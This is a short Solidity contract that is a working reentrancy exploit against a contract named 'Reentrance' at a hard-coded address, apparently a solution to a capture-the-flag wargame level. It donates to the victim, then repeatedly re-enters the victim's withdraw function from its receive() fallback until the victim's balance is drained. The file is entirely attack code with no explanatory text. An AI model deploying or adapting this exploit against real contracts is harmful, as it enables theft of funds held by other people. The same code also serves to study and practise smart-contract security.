// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./Reentrance.sol";
import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol';

contract Reentrancy{
    Reentrance victim;
    uint public amount = 1000000000000000;
    constructor()payable{
        victim = Reentrance(payable(0x09AF2f76b87b43f7ddeA1885F97E389009D78832));
    }

    function donate()public payable{
        victim.donate{value: amount}(address(this));
    }

    function withdraw(uint _amount) public {
        victim.withdraw(_amount);
    }
    
    receive() external payable{
        if(address(victim).balance != 0){
            victim.withdraw(amount);
        }
    }
}